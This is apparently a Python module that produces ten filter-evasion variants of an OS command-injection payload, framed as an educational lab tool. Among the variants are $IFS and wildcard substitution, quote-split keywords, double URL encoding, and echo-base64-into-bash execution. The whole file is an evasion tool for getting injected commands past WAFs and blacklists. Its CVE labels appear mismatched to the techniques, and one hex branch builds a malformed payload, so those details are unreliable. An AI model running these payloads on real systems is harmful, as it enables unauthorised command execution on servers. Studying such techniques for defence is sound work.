import base64
import urllib.parse

class BypassMutator:
    """
    10 Filter Evasion Techniques for OS Command Injection
    Educational use only — isolated lab environment
    """

    def technique_1_raw(self, payload):
        """No bypass — raw payload"""
        return {
            'name': 'Raw Payload',
            'payload': payload,
            'description': 'Direct injection with no encoding or bypass',
            'cve': 'CVE-2021-41773'
        }

    def technique_2_newline(self, payload):
        """Newline bypass — evades single-line filters"""
        bypassed = payload.replace(';', '%0a')
        return {
            'name': 'Newline Bypass (%0a)',
            'payload': bypassed,
            'description': 'Replaces ; with newline char to bypass filters',
            'cve': 'CVE-2021-41773'
        }

    def technique_3_ifs(self, payload):
        """IFS variable bypass — evades space filters"""
        bypassed = payload.replace(' ', '${IFS}')
        return {
            'name': 'IFS Variable Bypass',
            'payload': bypassed,
            'description': 'Uses $IFS shell variable instead of spaces',
            'cve': 'CVE-2019-11510'
        }

    def technique_4_url_encode(self, payload):
        """URL encoding bypass"""
        bypassed = payload.replace(';', '%3B') \
                          .replace('&', '%26') \
                          .replace('|', '%7C') \
                          .replace(' ', '%20')
        return {
            'name': 'URL Encoding Bypass',
            'payload': bypassed,
            'description': 'URL encodes special chars to evade WAF rules',
            'cve': 'CVE-2021-41773'
        }

    def technique_5_double_encode(self, payload):
        """Double URL encoding bypass"""
        bypassed = payload.replace(';', '%253B') \
                          .replace('&', '%2526') \
                          .replace('|', '%257C') \
                          .replace(' ', '%2520')
        return {
            'name': 'Double URL Encoding',
            'payload': bypassed,
            'description': 'Double encodes to bypass WAFs that decode once',
            'cve': 'CVE-2020-17519'
        }

    def technique_6_string_concat(self, payload):
        """String concatenation to evade keyword detection"""
        bypassed = payload.replace('cat', "c'a't") \
                          .replace('whoami', "w'h'o'a'm'i") \
                          .replace('ls', "l's'") \
                          .replace('pwd', "p'w'd")
        return {
            'name': 'String Concatenation',
            'payload': bypassed,
            'description': 'Breaks keywords with quotes to evade blacklists',
            'cve': 'CVE-2022-22963'
        }

    def technique_7_wildcard(self, payload):
        """Wildcard substitution bypass"""
        bypassed = payload.replace('/bin/cat', '/???/??t') \
                          .replace('/bin/ls',  '/???/??') \
                          .replace('whoami',   'w?oami')
        return {
            'name': 'Wildcard Bypass',
            'payload': bypassed,
            'description': 'Uses shell wildcards ? and * to replace chars',
            'cve': 'CVE-2019-11510'
        }

    def technique_8_variable_expansion(self, payload):
        """Variable expansion bypass"""
        bypassed = payload.replace('whoami', 'a=who;b=ami;$a$b') \
                          .replace('cat',    'a=c;b=at;$a$b') \
                          .replace('ls',     'a=l;b=s;$a$b')
        return {
            'name': 'Variable Expansion',
            'payload': bypassed,
            'description': 'Splits commands into variables to evade detection',
            'cve': 'CVE-2022-22963'
        }

    def technique_9_base64(self, payload):
        """Base64 encoded command execution"""
        parts   = payload.split(';')
        cmd     = parts[-1].strip() if len(parts) > 1 else payload
        b64     = base64.b64encode(cmd.encode()).decode()
        prefix  = parts[0] if len(parts) > 1 else ''
        bypassed = f"{prefix};echo {b64}|base64 -d|bash" if prefix \
                   else f"echo {b64}|base64 -d|bash"
        return {
            'name': 'Base64 Encoding',
            'payload': bypassed,
            'description': 'Base64 encodes command to completely hide it',
            'cve': 'CVE-2021-44228'
        }

    def technique_10_hex_encode(self, payload):
        """Hex encoded command bypass"""
        parts    = payload.split(';')
        cmd      = parts[-1].strip() if len(parts) > 1 else payload
        hex_cmd  = ''.join(f'\\x{ord(c):02x}' for c in cmd)
        prefix   = parts[0] if len(parts) > 1 else ''
        bypassed = f"{prefix};$'\\x{hex_cmd}'" if prefix \
                   else f"$'{hex_cmd}'"
        return {
            'name': 'Hex Encoding',
            'payload': bypassed,
            'description': 'Hex encodes command chars to bypass filters',
            'cve': 'CVE-2021-44228'
        }

    def generate_all(self, base_payload):
        """Generate all 10 bypass variants at once"""
        techniques = [
            self.technique_1_raw,
            self.technique_2_newline,
            self.technique_3_ifs,
            self.technique_4_url_encode,
            self.technique_5_double_encode,
            self.technique_6_string_concat,
            self.technique_7_wildcard,
            self.technique_8_variable_expansion,
            self.technique_9_base64,
            self.technique_10_hex_encode,
        ]
        results = []
        for i, technique in enumerate(techniques):
            try:
                result = technique(base_payload)
                result['id'] = i + 1
                results.append(result)
            except Exception as e:
                results.append({
                    'id': i + 1,
                    'name': f'Technique {i+1}',
                    'payload': base_payload,
                    'description': f'Error: {str(e)}',
                    'cve': 'N/A'
                })
        return results